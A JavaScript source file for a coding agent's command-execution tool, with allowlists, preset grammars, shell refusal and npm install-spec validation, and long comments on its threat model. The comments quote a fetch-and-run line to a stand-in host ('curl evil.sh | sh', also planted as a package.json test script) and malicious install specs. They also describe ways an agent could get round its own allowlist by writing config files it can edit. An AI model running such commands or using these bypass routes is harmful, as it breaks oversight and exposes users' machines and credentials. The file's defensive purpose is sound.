/**
 * RUN_COMMAND — the tool that turns "writes code" into "ships working code",
 * and the single most dangerous line in this package.
 *
 * ── ⚠️ WHAT THIS ALLOWLIST ACTUALLY BUYS, STATED HONESTLY ───────────────────
 * It is tempting to describe this file as a sandbox. It is not one, and saying
 * so would be the exact dishonesty the rest of the package is built to avoid.
 * `node src/thing.js`, where a language model wrote `src/thing.js` thirty
 * seconds ago, IS arbitrary code execution — by construction, and unavoidably,
 * because running the code is the entire point of a run-and-fix loop.
 *
 * So here is the real boundary, in the order it matters:
 *
 *   1. THE AGENT CANNOT COMPOSE A COMMAND. No shell is ever involved
 *      (`shell: false`, always), and on top of that every shell metacharacter
 *      is refused by a CHARACTER WHITELIST — so `npm test && curl evil.sh | sh`
 *      dies at the `&`, not at some blacklist of program names. `$(...)`,
 *      backticks, `;`, `>`, newlines and quotes die the same way.
 *   2. THE AGENT CANNOT PICK A PROGRAM. Four binaries by default, named here.
 *      `rm`, `curl`, `git`, `powershell`, `pip` and every other executable on
 *      the machine are simply not reachable — there is no path from a model
 *      string to `spawn` of anything except node, npm, npx and tsc.
 *
 *      ⚠️ AND THE ONE WAY THAT LIST CHANGES, STATED HERE SO NOBODY HAS TO FIND
 *      IT: a HUMAN may add ecosystems — `pytest`, `go`, `cargo`, `rspec`,
 *      `make`, workspace `eslint` — through `.acuvo/commands.json` or
 *      `ACUVO_ALLOW_COMMANDS`. Nothing is added by default; a user who writes no
 *      configuration gets exactly the four. Every added binary goes through the
 *      SAME character whitelist, the SAME flag whitelist, the SAME workspace
 *      path rule and the SAME environment scrub. The workspace file can only
 *      pick from a vetted menu of build-and-test drivers, because the agent can
 *      write that file; an arbitrary program name is admin-only. **A shell is
 *      refused at every layer, including the admin one** — a shell returns
 *      promise (1), which every other guard here is built on top of. See
 *      `COMMAND_PRESETS` for the full argument, including what enabling a
 *      preset does NOT buy: `make` still reads a Makefile the agent can write,
 *      and that is documented rather than pretended away.
 *   3. THE ARGUMENTS ARE CHECKED, NOT JUST THE BINARY. `node --eval` and
 *      `npx <anything-from-the-registry>` are the two obvious escapes and both
 *      are closed; every non-flag token must pass the SAME workspace path rule
 *      the file tools use, so `node ../../../etc/thing.js` never runs.
 *   4. THE CREDENTIALS LEAVE THE ROOM. The child gets a scrubbed environment,
 *      because step 1–3 still leave a process that can `fetch()`, and the
 *      cheapest catastrophe available to a coding agent is reading your API
 *      keys out of `process.env` and posting them somewhere.
 *   5. IT IS BOUNDED AND VISIBLE. One command, one timeout, capped output,
 *      cwd pinned to the workspace, and every single thing it ran is printed.
 *
 * ⚠️ AND THE HOLE THAT IS *NOT* CLOSED, NAMED RATHER THAN HIDDEN: the code the
 * command runs can do anything Node can do, including writing outside the
 * workspace. The mitigation is not a technical one — it is that the code is ON
 * DISK, was written by tools that could not leave the workspace, and is shown
 * to you. `--dry-run` refuses to run anything at all, which is the escape hatch
 * for a task you do not trust yet.
 *
 * ── THE TRAP THAT MAKES THIS MORE THAN A LIST OF BINARY NAMES ───────────────
 * `npm test` is on the allowlist. `npm test` runs whatever `package.json` says
 * — and `package.json` is a file THIS AGENT CAN WRITE. An allowlist that stops
 * at the word "npm" therefore allows `{"scripts":{"test":"curl evil.sh | sh"}}`
 * followed by `npm test`, which is a full bypass in two tool calls that both
 * look innocent. So the script BODY is read and validated through the same
 * rules before npm is spawned, and so are its `pre`/`post` hooks, which npm
 * runs without being asked.
 */

import { spawn } from 'node:child_process';
import { existsSync } from 'node:fs';
import { dirname, join } from 'node:path';

import { normalizeRelativePath } from './workspace.mjs';
/**
 * ── ⭐⭐⭐ THE PYTHON GRAMMAR, WHICH WAS WRITTEN AND THEN IMPORTED BY NOBODY ──
 *
 * `lib/python.mjs` is 862 lines, complete, tested, and was reachable from no
 * entry point — `wiring-reach.test.mjs` had been failing on it, saying exactly
 * what that means: *"a capability nobody can reach has not shipped."*
 *
 * Its own header states the measurement that produced it: on the 13-task bench
 * the ONE failure was a Python task, and it did not fail on reasoning. The model
 * fixed the bug correctly, went to run `pytest`, and `pytest -q` was refused.
 * *"A coding agent that can only run JavaScript is a JavaScript agent with a
 * coding agent's marketing."*
 *
 * ⭐ AND THE PRESET BELOW WAS NOT A SMALLER VERSION OF IT — IT WAS WRONG.
 * `PYTHON_GRAMMAR` validated everything after `-m` against the INTERPRETER's
 * flag list, but CPython stops parsing its own options at `-m`: everything after
 * the module name belongs to the MODULE. So `python -m pytest -q` — the single
 * most typed command in Python testing, and the exact one the bench needed — was
 * refused with "-q is not an allowed python flag", which is the worst class of
 * guard there is: one that refuses correct work with a message that reads like a
 * rule.
 */
import { PYTHON_PRESET_GRAMMAR, validatePythonArgv } from './python.mjs';

/** A command longer than this is not a command, it is a program. */
export const MAX_COMMAND_LENGTH = 240;
export const MAX_COMMAND_TOKENS = 16;
/** Long enough for a real test suite on a cold cache, short enough that a hung
 *  watcher costs a minute rather than a session. */
export const DEFAULT_COMMAND_TIMEOUT_MS = 120_000;
export const MAX_COMMAND_TIMEOUT_MS = 600_000;
/** Per stream, per run. Test output is unbounded and the model pays per token. */
export const MAX_CAPTURED_CHARS = 8_000;
/**
 * ⚠️ HOW LONG WE WAIT FOR THE PIPES AFTER THE PROCESS IS ALREADY GONE.
 *
 * Not a second timeout — a settle window. See `spawnBounded`: `close` needs EOF
 * on the captured pipes as well as process exit, and a surviving descendant can
 * withhold that EOF forever. This is how long we give the normal, correct settle
 * to arrive before we return what we have anyway. Short enough to be invisible
 * on a healthy run (where `close` beats it by microseconds), long enough that a
 * killed test runner's last few lines still make it into the result.
 */
export const TIMEOUT_SETTLE_GRACE_MS = 750;

/**
 * The four. Not a starting point — a decision, and it is the DEFAULT surface:
 * what a user who has written no configuration gets.
 *
 * ⚠️ IT DOES NOT GROW. Every other ecosystem below is shipped as an OFF-by-
 * default preset, and the reason is a concrete property of these four rather
 * than a preference: **none of them resolves through `PATH`.** `node` is
 * `process.execPath` — the interpreter already running this process. `npm` and
 * `npx` are JavaScript files found next to that binary. `tsc` is a file inside
 * the workspace's own `node_modules`. A `python` or a `make` cannot be found
 * that way; it is whatever `PATH` says it is on the day the command runs, which
 * is a materially weaker statement, and it is the human's to make, not ours.
 */
export const ALLOWED_BINARIES = ['node', 'npm', 'npx', 'tsc'];

/**
 * ── ⚠️⭐ `--shell`: THE CEILING, AND WHAT IT COSTS TO RAISE IT ──────────────
 *
 * MEASURED, not assumed: the allowlist is this agent's benchmark ceiling. On
 * our own `polyglot` bench task it fixed a Python bug correctly, then could not
 * run `pytest`, and — correctly — **did not grant itself permission**. It
 * verified another way and stopped. Terminal-Bench is largely made of tasks
 * shaped exactly like that, so with the allowlist alone most of it is
 * unreachable by construction, however good the loop is.
 *
 * ⭐ SO THE SHELL IS OPT-IN AND THE LOCKED DEFAULT SURVIVES INTACT. That is the
 * whole point of the flag: "it can only run node, npm, npx and tsc" stays TRUE
 * of the default install, so the sentence we sell to an enterprise is still a
 * fact rather than a fact-with-an-asterisk. Someone who needs the rest opts in
 * per run, deliberately, and sees it said back to them.
 *
 * ⚠️ WHAT IT REALLY MEANS, WRITTEN PLAINLY: with `--shell` this agent can run
 * ANY program on the machine, with the caller's own privileges. `rm -rf`, curl,
 * ssh, a package install, an outbound POST of the entire workspace. There is no
 * clever middle setting, and pretending otherwise is worse than the risk: a
 * blocklist of "dangerous" patterns would be trivially bypassable and would
 * teach the operator that the mode is safer than it is.
 *
 * ⚠️ THE GUARANTEES THAT DO SURVIVE, because they cost nothing to keep:
 *   · cwd is the workspace · the API key is still scrubbed from the child env
 *   · the timeout still fires and still kills the whole process TREE
 *   · every command is still written to the audit log, before it runs
 * What is gone is the allowlist and the metacharacter ban. Nothing else.
 */
export const SHELL_MAX_COMMAND_LENGTH = 4_000;

/**
 * Build the argv that hands a command line to the platform's shell.
 *
 * ⚠️ THE SHELL IS INVOKED AS A PROGRAM, RATHER THAN VIA `shell: true`. Node's
 * `shell: true` composes the command line itself and would put a second layer
 * of quoting between the model's text and the shell — and on Windows it also
 * loses the process-group handle the tree-kill depends on. Spawning
 * `sh -c <command>` keeps `spawnBounded` byte-for-byte as it is, so the
 * timeout, the tree kill, the env scrub and the output caps all still apply.
 */
export function buildShellInvocation(command, { platform = process.platform, env = process.env } = {}) {
  const line = String(command ?? '').trim();
  if (!line) return { ok: false, error: 'run_command needs a command to run' };
  if (line.length > SHELL_MAX_COMMAND_LENGTH) {
    return { ok: false, error: `that command is ${line.length} characters; the limit is ${SHELL_MAX_COMMAND_LENGTH}. Put a long pipeline in a script file and run the file.` };
  }
  if (platform === 'win32') {
    /**
     * ⚠️ `/d` DISABLES AutoRun. Without it, cmd.exe executes whatever is in
     * `HKCU\\Software\\Microsoft\\Command Processor\\AutoRun` BEFORE our command
     * — someone else's script running inside what the audit log records as ours.
     */
    return { ok: true, file: env.ComSpec || 'cmd.exe', args: ['/d', '/s', '/c', line] };
  }
  return { ok: true, file: env.SHELL && /(^|\/)(ba|z|)sh$/.test(env.SHELL) ? env.SHELL : '/bin/sh', args: ['-c', line] };
}

/**
 * ── ⭐⭐ THE POLYGLOT PRESETS — WHAT THIS SOLVES AND WHAT IT REFUSES TO ──────
 *
 * `ENTERPRISE.md` §5.1 states the defect in the vendor's own words: a Python,
 * Go, Rust, Java or Ruby shop "cannot execute a single test with this tool",
 * so the run→fix loop — the entire product — degrades to "writes files and
 * cannot check them". That is not a missing nicety. It is the loop being
 * unavailable to most of the world's repositories.
 *
 * ── ⚠️ THE QUESTION THAT DECIDES THE DESIGN: WHAT WAS THE BOUNDARY, REALLY? ─
 *
 * The header above already concedes the big one: `node src/thing.js`, where a
 * model wrote `src/thing.js` thirty seconds ago, IS arbitrary code execution.
 * So the boundary was never "the agent cannot execute code". It is three
 * narrower promises, and they are the ones that must survive:
 *
 *   1. the agent cannot COMPOSE a command   (no shell, character whitelist)
 *   2. the agent cannot PICK a program      (a list a human agreed to)
 *   3. the agent cannot reach a CREDENTIAL  (the environment scrub)
 *
 * A preset extends (2) — from four programs to a menu of build-and-test drivers
 * — and touches neither (1) nor (3). That is why adding `pytest` is a different
 * act from adding `bash`: `bash` hands back (1), which is the promise every
 * other guard in this file is written on top of. So a shell is refused even to
 * an administrator, and that refusal is the one hard line here.
 *
 * ── ⚠️⚠️ THE TRAP, NAMED RATHER THAN PAPERED OVER ──────────────────────────
 *
 * `make` reads a Makefile the agent can write. `pytest` imports a `conftest.py`
 * the agent can write. `cargo test` compiles a `build.rs` the agent can write.
 * `go test` will fetch and compile modules. **None of these is validated, and
 * none of them can be honestly validated by this file.**
 *
 * The npm gate below is possible for one reason: a `package.json` script body
 * is a single command string in a machine-readable field, so it can be run back
 * through the same validator. A Makefile recipe is *shell*. Validating it means
 * writing a shell parser, and a partial shell parser that waves through what it
 * does not understand is exactly the thing this file already refuses to build
 * (see `ALLOWED_SCRIPT_BINARIES` on why npm→npm chains are refused rather than
 * followed). So the honest position, written down rather than implied:
 *
 *   **Enabling a preset does not weaken the boundary, because the boundary was
 *   never "the agent cannot run code it wrote" — `node <file>` already grants
 *   that, on the default surface, to every user. What a preset grants is one
 *   more INTERPRETER for code that is already on disk and already reviewable.**
 *
 * ⭐ And the mitigation is unchanged and real: the code is ON DISK, it was
 * written by tools that could not leave the workspace, it is shown to you, and
 * `--dry-run` refuses to execute anything at all.
 *
 * ⚠️ WHAT IS DELIBERATELY NOT ON THE MENU, and why each is a different class:
 *   · shells (`bash`, `sh`, `cmd`, `powershell`) — they return promise (1).
 *   · package installers (`pip install`, `bundle install`, `cargo install`,
 *     `go install`) — they fetch a stranger's code and run its build hooks,
 *     which is the same refusal `npm install` already gets, for the same reason.
 *   · anything whose argument grammar we cannot state. An ungoverned binary is
 *     not on the menu; see the `grammar` map — a preset binary with no spec is
 *     a test failure, not a silent pass.
 */

/**
 * A grammar for one binary. Every field is the SAME shape the existing four are
 * validated with, so a preset binary is not checked by a second, laxer path.
 *
 * @typedef {{
 *   flags?: Set<string>,
 *   valueFlags?: Set<string>,
 *   separateValueFlags?: Map<string, Set<string> | RegExp>,
 *   refused?: Map<string, string>,
 *   subcommands?: Set<string> | null,
 *   refusedSubcommands?: Map<string, string>,
 *   packagePatterns?: boolean,
 *   delegates?: boolean,
 *   resolve?: 'path' | 'node-module',
 *   nodeModule?: string[],
 * }} BinaryGrammar
 */

const WATCHER_REASON = 'a watcher never exits, so it would spend the whole timeout and return nothing';
const EVAL_REASON = 'code passed on the command line is never written to disk, so nothing it did can be reviewed afterwards';
const INTERACTIVE_REASON = 'an interactive prompt never exits, so it would spend the whole timeout and return nothing';
const REGISTRY_REASON = 'it downloads and executes code from a package registry, which is the one thing an allowlist of programs cannot check';

/**
 * ⚠️ `python` AND `python3` ARE THE SAME PROGRAM WITH TWO NAMES, and giving one
 * of them a grammar and the other nothing is how an "allowed" binary ends up
 * accepting no arguments at all. Caught by a test on the first run: `python3 -V`
 * was refused with "allowed: " and an empty list, which is a defect that reads
 * like a rule.
 */
const PYTHON_GRAMMAR = {
  flags: new Set(['-V', '--version', '-B', '-u', '-W', '-O']),
  separateValueFlags: new Map([['-m', new Set(['pytest', 'unittest', 'compileall', 'json.tool'])]]),
  refused: new Map([
    ['-c', EVAL_REASON],
    ['-i', INTERACTIVE_REASON],
    ['-', 'a lone "-" reads the program from stdin, which is code that never touches disk'],
  ]),
  resolve: 'path',
};

/** @type {Record<string, { describe: string, binaries: string[], grammar: Record<string, BinaryGrammar> }>} */
export const COMMAND_PRESETS = {
  /**
   * ⭐ EVERY PYTHON BINARY DELEGATES TO `validatePythonArgv`, and the marker is
   * `pythonic`. The generic `validateOperands` cannot express "argument
   * authority transfers at `-m`" — that is not a flag it is missing, it is a
   * shape it has no way to describe — so the dispatcher routes these binaries
   * to the grammar written for them.
   *
   * ⚠️ `py` IS NEW AND IT IS NOT COSMETIC. On Windows, the platform this package
   * is developed on, python.org's installer puts `py.exe` on PATH and often does
   * not put `python.exe` there at all. Refusing `py` was refusing Python on the
   * developer's own laptop.
   */
  python: {
    describe: PYTHON_PRESET_GRAMMAR.describe,
    binaries: [...PYTHON_PRESET_GRAMMAR.binaries],
    grammar: Object.fromEntries(
      PYTHON_PRESET_GRAMMAR.binaries.map((bin) => [bin, { pythonic: true, resolve: 'path' }]),
    ),
  },
  go: {
    describe: 'the Go toolchain — `go test ./...`, `go build ./...`, `go vet ./...`',
    binaries: ['go'],
    grammar: {
      go: {
        subcommands: new Set(['test', 'build', 'vet', 'fmt', 'version']),
        refusedSubcommands: new Map([
          ['install', REGISTRY_REASON],
          ['get', REGISTRY_REASON],
          ['run', 'use `go build` then run the binary, so what executed is a file on disk you can look at'],
          ['generate', 'it executes directives written in source comments, which is a second command layer this validator cannot see'],
        ]),
        flags: new Set(['-v', '-race', '-short', '-json', '-cover', '-count=1', '-n']),
        valueFlags: new Set(['-run', '-count', '-timeout', '-tags', '-o', '-bench']),
        separateValueFlags: new Map([['-run', /^[A-Za-z0-9_/^$|.*?()-]+$/], ['-timeout', /^[0-9]+[smh]?$/], ['-count', /^[0-9]+$/]]),
        packagePatterns: true,
        resolve: 'path',
      },
    },
  },
  rust: {
    describe: 'Cargo — `cargo test`, `cargo build --release`, `cargo clippy`',
    binaries: ['cargo'],
    grammar: {
      cargo: {
        subcommands: new Set(['test', 'build', 'check', 'clippy', 'fmt', 'bench', 'version']),
        refusedSubcommands: new Map([
          ['install', REGISTRY_REASON],
          ['add', REGISTRY_REASON],
          ['publish', 'it uploads this crate to a public registry, which is not a step an agent takes unattended'],
          ['watch', WATCHER_REASON],
          ['run', 'use `cargo build` then run the binary, so what executed is a file on disk you can look at'],
        ]),
        flags: new Set(['--release', '--quiet', '-q', '--all-features', '--no-default-features', '--lib', '--bins', '--tests', '--all-targets', '--workspace', '--locked', '--offline', '--verbose']),
        valueFlags: new Set(['--package', '--manifest-path', '--target', '--features', '--test', '--bin']),
        separateValueFlags: new Map([['--package', /^[A-Za-z0-9_-]+$/], ['-p', /^[A-Za-z0-9_-]+$/]]),
        resolve: 'path',
      },
    },
  },
  ruby: {
    describe: 'Ruby, RSpec and `bundle exec` — `rspec`, `ruby test/run.rb`',
    binaries: ['ruby', 'rspec', 'bundle'],
    grammar: {
      ruby: {
        flags: new Set(['-v', '--version', '-w', '--verbose']),
        refused: new Map([
          ['-e', EVAL_REASON],
          ['-r', '--require preloads a module the command does not name; write a file and run it instead'],
          ['--require', '--require preloads a module the command does not name; write a file and run it instead'],
          ['-n', 'the implicit loop wraps your script in code that is not in the file'],
        ]),
        resolve: 'path',
      },
      rspec: {
        flags: new Set(['--no-color', '--fail-fast', '--dry-run', '--backtrace', '-b']),
        valueFlags: new Set(['--format', '-f', '--out', '--seed', '--example', '-e', '--tag', '-t']),
        separateValueFlags: new Map([['--format', /^[A-Za-z0-9_.:-]+$/], ['-f', /^[A-Za-z0-9_.:-]+$/]]),
        resolve: 'path',
      },
      bundle: {
        subcommands: new Set(['exec']),
        refusedSubcommands: new Map([
          ['install', REGISTRY_REASON],
          ['update', REGISTRY_REASON],
          ['add', REGISTRY_REASON],
          ['console', INTERACTIVE_REASON],
        ]),
        /** ⭐ `bundle exec <x>` delegates the program choice, so `<x>` is put
         *  back through the allowlist rather than trusted. */
        delegates: true,
        resolve: 'path',
      },
    },
  },
  make: {
    describe: 'GNU make — `make test`. ⚠️ The Makefile is not validated; see the header',
    binaries: ['make'],
    grammar: {
      make: {
        flags: new Set(['-n', '--dry-run', '-B', '--always-make', '-k', '-s', '--silent', '-i', '--version']),
        valueFlags: new Set(['-j', '--jobs', '-f', '--file']),
        separateValueFlags: new Map([['-j', /^[0-9]+$/], ['--jobs', /^[0-9]+$/]]),
        refused: new Map([
          ['-C', 'it moves make out of the workspace, which is the one thing the pinned cwd exists to prevent'],
          ['--directory', 'it moves make out of the workspace, which is the one thing the pinned cwd exists to prevent'],
          ['-w', WATCHER_REASON],
        ]),
        resolve: 'path',
      },
    },
  },
  'node-bin': {
    describe: 'linters and runners from THIS workspace\'s node_modules — eslint, prettier, jest',
    binaries: ['eslint', 'prettier', 'jest'],
    grammar: {
      eslint: {
        flags: new Set(['--fix', '--quiet', '--no-color', '--no-eslintrc', '--cache', '--max-warnings=0']),
        valueFlags: new Set(['--format', '-f', '--ext', '--config', '-c', '--max-warnings']),
        separateValueFlags: new Map([['--format', /^[A-Za-z0-9_.-]+$/], ['--max-warnings', /^[0-9]+$/]]),
        resolve: 'node-module',
        nodeModule: ['node_modules/eslint/bin/eslint.js'],
      },
      prettier: {
        flags: new Set(['--check', '-c', '--write', '-w', '--no-color', '--list-different', '-l']),
        valueFlags: new Set(['--config', '--parser', '--log-level']),
        resolve: 'node-module',
        nodeModule: ['node_modules/prettier/bin/prettier.cjs', 'node_modules/prettier/bin-prettier.js', 'node_modules/prettier/bin/prettier.js'],
      },
      jest: {
        flags: new Set(['--ci', '--silent', '--no-color', '--runInBand', '-i', '--coverage', '--passWithNoTests']),
        valueFlags: new Set(['--testPathPattern', '--testNamePattern', '-t', '--maxWorkers', '--reporters']),
        separateValueFlags: new Map([['-t', /^[A-Za-z0-9_.:*?-]+$/]]),
        refused: new Map([['--watch', WATCHER_REASON], ['--watchAll', WATCHER_REASON]]),
        resolve: 'node-module',
        nodeModule: ['node_modules/jest/bin/jest.js'],
      },
    },
  },
};

export const PRESET_NAMES = Object.freeze(Object.keys(COMMAND_PRESETS));

/**
 * ⚠️⚠️ THE ONE HARD LINE, AND IT APPLIES TO THE ADMINISTRATOR TOO.
 *
 * Promise (1) — "the agent cannot compose a command" — is what every other
 * guard in this file is built on. A shell hands it straight back: one allowed
 * binary and the character whitelist is decoration, because the shell parses
 * the string we so carefully refused to let anyone parse. There is no
 * configuration that turns it on. An organisation that wants a shell wants a
 * different tool, and saying so is more honest than a flag that quietly voids
 * the security section of the README.
 */
const NEVER_ALLOWED_BINARIES = new Set([
  'bash', 'sh', 'zsh', 'ksh', 'dash', 'fish', 'csh', 'tcsh',
  'cmd', 'cmd.exe', 'powershell', 'powershell.exe', 'pwsh', 'command.com',
  'env', 'xargs', 'eval', 'exec', 'nohup', 'setsid', 'start',
]);

/** Where a project opts itself in. Same `.acuvo/` directory as `policy.json`. */
export const COMMANDS_CONFIG_FILE = '.acuvo/commands.json';
/** The admin route — an environment variable the agent has no verb that reaches. */
export const ALLOW_COMMANDS_ENV = 'ACUVO_ALLOW_COMMANDS';

/**
 * ── ⚠️⚠️⭐ `npm install` — THE MOST DANGEROUS THING IN THIS PACKAGE, AND WHY
 *    IT IS NOT A PRESET ─────────────────────────────────────────────────────
 *
 * THE GAP, MEASURED: "add zod validation to this endpoint" is a first-ten-
 * minutes request and it dead-ended. The agent writes `import { z } from 'zod'`,
 * runs the file, gets ERR_MODULE_NOT_FOUND, and there is no verb in the package
 * that can ever make that import resolve. Every allowlisted route — `npm
 * install`, `npm ci`, `npx`, `bundle install`, `pip install`, `cargo add`,
 * `go get` — is refused. A coding agent that cannot add a dependency is a
 * coding agent that can only work on projects that already have every
 * dependency it will ever need.
 *
 * ── ⚠️ SO WHY NOT JUST ADD IT TO `COMMAND_PRESETS`, LIKE `python`? ──────────
 *
 * Because the preset menu's entire safety argument, written at "WHY THE
 * WORKSPACE FILE MAY ONLY PICK FROM A MENU" below, is this sentence:
 *
 *   *"`write_file('.acuvo/commands.json', {"presets":["python"]})` buys the
 *   agent a second INTERPRETER for code it could already execute with `node`.
 *   It does not buy a shell, a DOWNLOADER, or a program of its choosing."*
 *
 * ⭐ An install preset makes that sentence FALSE. `.acuvo/commands.json` is a
 * file this agent can write, so a preset named `npm-install` would be the agent
 * granting itself a downloader in one `write_file` — and a downloader is
 * categorically different from an interpreter: `node evil.js` runs code that is
 * ON DISK and was written by tools that could not leave the workspace, while
 * `npm install` runs code that arrived from a stranger thirty milliseconds ago
 * and which nobody has read.
 *
 * ⭐ THEREFORE: install is gated on an ENVIRONMENT VARIABLE ONLY — the one door
 * the agent has no verb that reaches. Exactly the shape `git.mjs` already uses
 * for `ACUVO_ALLOW_PUSH` (the only other verb whose blast radius leaves this
 * machine), and deliberately the same shape so an operator learns it once.
 *
 * ── ⚠️ AND THE COST OF THE GATE IS REAL, NOT HYPOTHETICAL ───────────────────
 * The `polyglot` bench task fails precisely because a capability default is off.
 * An over-tight gate is a measurable loss, not a free win. That is why the
 * REFUSAL NAMES THE SWITCH (see `validateNpm`) rather than naming a rule: the
 * agent that hits this wall can tell the human the exact variable to set, in
 * the same round, instead of silently giving up. A capability nobody can find
 * is the same as a capability that does not exist — this package has shipped
 * that defect four times.
 */
export const ALLOW_INSTALL_ENV = 'ACUVO_ALLOW_INSTALL';

/** ⚠️ Absent means OFF. Same parse as `git.mjs`'s `pushEnabled`, on purpose. */
export function installEnabled(env = process.env) {
  const raw = String(env?.[ALLOW_INSTALL_ENV] ?? '').trim().toLowerCase();
  return raw === '1' || raw === 'true' || raw === 'yes' || raw === 'on';
}

/**
 * ⚠️ THE SUBCOMMANDS THAT FETCH. Bound to the NOUN rather than to a caller's
 * boolean: `buildInvocation` re-derives "is this an install?" from the argv it
 * is about to spawn, so a caller that forgets to pass a flag still gets
 * `--ignore-scripts`. (A guard that depends on being told is a guard that will
 * be satisfied by coincidence — this package has a memory of exactly that.)
 */
const NPM_INSTALL_SUBCOMMANDS = new Set(['install', 'i', 'add', 'ci']);

/**
 * ⚠️ FOUR, AND THE NUMBER IS AN ARGUMENT, NOT A ROUND FIGURE. Each name on an
 * install line is an independent typosquat opportunity and an independent thing
 * a human has to eyeball in the diff. One request ("add zod", "add express and
 * its types") is one or two names; a line with nine is a model batching, which
 * is the case where nobody reads any of them.
 */
export const MAX_INSTALL_PACKAGES = 4;

/**
 * ── ⚠️ THE ONE PLACE A CALLER'S TIMEOUT IS RAISED RATHER THAN OBEYED ────────
 *
 * Everywhere else in this package a requested timeout is honoured exactly,
 * because clamping one up means the result says `timedOut: false` for a run that
 * was never given the timeout it asked for (see `spawn-argv.mjs`'s
 * `MIN_TIMEOUT_MS` for the full argument). An install is the deliberate
 * exception, and the reason is that the two cases are not symmetric:
 *
 *   · a short timeout elsewhere is a legitimate "is this hung?" probe, and
 *     killing the child costs nothing;
 *   · a short timeout on an install leaves `node_modules` HALF POPULATED — a
 *     state nobody chose, which the next command silently reads as "the package
 *     is installed" and fails in a way that looks like a bug in the code.
 *
 * ⚠️ AND IT IS NOT THEORETICAL: the tool dispatcher passes the 120s default
 * command timeout to every `run_program` call, and a cold install of a real
 * dependency tree exceeds that routinely. Without this floor the capability
 * would ship as "works on a warm cache", which is the shape of a feature that
 * passes its tests and fails its users.
 */
export const INSTALL_MIN_TIMEOUT_MS = 300_000;

/**
 * The ONLY flags an install may carry. A whitelist, like everything else here.
 *
 * ⚠️ `--ignore-scripts` is accepted and is a NO-OP — it is forced at spawn time
 * regardless. Accepting it costs nothing and stops the model being punished for
 * doing the safe thing it was told to do.
 */
const INSTALL_FLAGS = new Set([
  '--save-dev', '-D', '--save-prod', '-P', '--save-exact', '-E',
  '--ignore-scripts', '--no-audit', '--no-fund', '--legacy-peer-deps',
]);

/**
 * Refusals that need a SENTENCE, because "not an allowed flag" reads like an
 * omission and every one of these is a decision.
 */
const REFUSED_INSTALL_FLAGS = new Map([
  ['-g', 'a global install writes outside the workspace, which is the one thing the pinned cwd exists to prevent'],
  ['--global', 'a global install writes outside the workspace, which is the one thing the pinned cwd exists to prevent'],
  ['--prefix', 'it moves the install out of the workspace'],
  ['--registry', 'it points the install at a registry nobody in this repository agreed to; the registry is the operator\'s choice, not the agent\'s'],
  ['--no-save', 'an install that is not recorded in package.json vanishes on the next clean checkout and never appears in a diff — the whole point of adding a dependency is that the addition is reviewable'],
  ['--no-package-lock', 'the lockfile is the record of exactly what was fetched; skipping it makes the install unreproducible'],
  ['--force', 'it overrides the conflicts npm raises, which are the only signal that something is wrong'],
  ['--no-ignore-scripts', 'install scripts are refused unconditionally here — see --ignore-scripts'],
  ['--foreground-scripts', 'install scripts are refused unconditionally here — see --ignore-scripts'],
  ['--unsafe-perm', 'it runs lifecycle scripts as the invoking user, and lifecycle scripts do not run here at all'],
]);

/**
 * ── ⚠️⚠️ WHAT A PACKAGE SPEC IS ALLOWED TO BE, AND WHAT IT CANNOT SAY ───────
 *
 * `npm install <spec>` accepts far more than a package name. All of these are
 * legal npm and every one of them is a different program arriving:
 *
 *   · `https://evil.example/x.tgz`   — a tarball from anywhere
 *   · `git+ssh://git@host/x.git`     — a repository from anywhere
 *   · `file:../../../etc`            — a directory outside the workspace
 *   · `user/repo`                    — GitHub shorthand, no protocol needed
 *   · `zod@npm:evil-package`         — an ALIAS: the name in package.json says
 *                                      `zod` and the code that lands is not zod
 *
 * ⭐ The alias is the nastiest, because the resulting `package.json` line reads
 * as the package the human asked for. So this is a whitelist of shape: a
 * REGISTRY NAME, optionally with a version, and nothing else. Every form above
 * dies on the `:` rule or the `/` rule.
 *
 * ⚠️⚠️ WHAT THIS DOES **NOT** SOLVE, STATED PLAINLY BECAUSE PRETENDING WOULD BE
 * WORSE THAN THE RISK: **a package NAME chosen by a language model is not
 * safe.** `zod` and `zodd` are both perfectly-shaped registry names, and the
 * Shai-Hulud npm worm shipped its payload inside AI coding-agent config files
 * precisely because agents install what they are told to install. No regex
 * distinguishes a typosquat from the real thing, and a blocklist of known-bad
 * names would be stale the day it shipped — this file already refuses to build
 * that kind of guard (see the shell argument).
 *
 * ⭐ WHAT ACTUALLY REDUCES THE BLAST RADIUS IS `--ignore-scripts`, FORCED: a
 * typosquat that lands on disk has NOT executed. It becomes code in
 * `node_modules` that only runs if the agent's own code imports it — which is
 * the same risk class as `node <file the model wrote>`, the risk this package
 * has always openly carried, rather than the strictly worse "arbitrary code ran
 * during a command that looked like housekeeping".
 *
 * @param {string} spec one operand of an install command
 */
export function validateInstallSpec(spec) {
  const text = String(spec ?? '');
  if (!text) return { ok: false, error: 'an empty package name is not a package' };
  if (text.length > 214) return { ok: false, error: `"${text.slice(0, 40)}…" is longer than npm's 214-character limit, so it is not a package name` };
  if (text.startsWith('-')) return { ok: false, error: `"${text}" starts with "-", so it is a flag npm does not have, not a package` };

  /**
   * ⚠️ `:` IS THE ONE CHARACTER THAT TURNS A NAME INTO A LOCATION. `npm:`,
   * `file:`, `git+ssh:`, `https:` — all of them. Refused before anything else
   * so no later rule has to be clever about protocols.
   */
  if (text.includes(':')) {
    return { ok: false, error: `"${text}" names a location rather than a registry package (":" appears in it). URL, git, file: and npm: alias specs are refused — an alias in particular makes package.json say one name while a different package lands. Install by registry name only, e.g. "zod" or "zod@4.1.12".` };
  }
  if (text.includes('\\')) return { ok: false, error: `"${text}" contains a backslash, so it is a path, not a package name` };

  const at = text.startsWith('@') ? text.indexOf('@', 1) : text.indexOf('@');
  const name = at === -1 ? text : text.slice(0, at);
  const version = at === -1 ? null : text.slice(at + 1);

  if (name.startsWith('@')) {
    // A scope is the ONLY legal `/`. `user/repo` (GitHub shorthand) has no `@`
    // and therefore never reaches this branch — it dies on the rule below.
    const parts = name.slice(1).split('/');
    if (parts.length !== 2 || !parts[0] || !parts[1]) {
      return { ok: false, error: `"${name}" is not a scoped package name — it must be exactly @scope/name` };
    }
    if (!isPlainPackageWord(parts[0]) || !isPlainPackageWord(parts[1])) {
      return { ok: false, error: `"${name}" is not a valid scoped package name (lowercase letters, digits, . _ - only)` };
    }
  } else {
    if (name.includes('/')) {
      return { ok: false, error: `"${name}" contains "/" without a leading "@", which is GitHub shorthand for a repository — that fetches code from outside the registry and is refused. Use the published package name.` };
    }
    if (!isPlainPackageWord(name)) {
      return { ok: false, error: `"${name}" is not a valid npm package name (lowercase letters, digits, . _ - only, and it may not begin with . or _)` };
    }
  }

  if (version !== null) {
    const v = validateInstallVersion(version, text);
